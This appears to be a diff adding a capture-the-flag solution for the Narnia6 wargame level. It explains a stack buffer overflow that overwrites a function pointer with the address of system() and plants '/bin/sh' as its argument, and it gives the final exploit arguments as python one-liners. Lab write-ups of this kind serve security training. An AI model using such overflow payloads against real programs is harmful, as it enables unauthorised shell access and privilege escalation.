@@ -1,0 +1,24 @@
+using buffer overflow to overwrite a function pointer to point to system call with arg "/bin/sh"
+
+stack is arranged this way (from lower adr to higher adr): 
+3. adr: [ebp-0x1c] char b2[8] 
+2. adr: [ebp-0x14] : char b1[8]
+1. adr: [ebp-0xc] : *fp a pointer to the puts function.
+
+solution: 
+-narnia6 accepts two arguments in argv. the first is copied to b1, the second is copied to b2. at the end of the function fp is called (which will call puts) with b1 as its argument.
+-using the first copy to overflow from b1 to the pointer *fp -> overwriting its current value (address of puts) to be the address of system (found by gdb) : system address: 0xf7e4c850
+-using the second to overflow from b2 to b1 -> writing the string "/bin/sh". b1 is the argument of the function call made by the pointer *fp - which we changed to be "system"
+	we want this argument to be "/bin/sh" so system will us a shell : system("/bin/bash").
+
+argA (first strcpy - copied to b1): (1)"B"*8 + (2)"\x50\xc8\xe4\xf7"
+(1) - random data just to fill the 8 bytes of b1
+(2) - overflow the next 4 bytes of *fp pointer with: 0xf7e4c850 - adr of system
+
+argB (second strcpy - copied to b2):  (1)"A"*8 +(2)"/bin/sh"
+(1) - random data just to fill the 8 bytes of b2
+(2) - overflow the next 8 bytes of b1 with the string "/bin/sh"
+
+final arguments:
+$(python -c 'print "B"*8 + "\x50\xc8\xe4\xf7"') $(python -c 'print "A"*8 + "/bin/sh"')
+
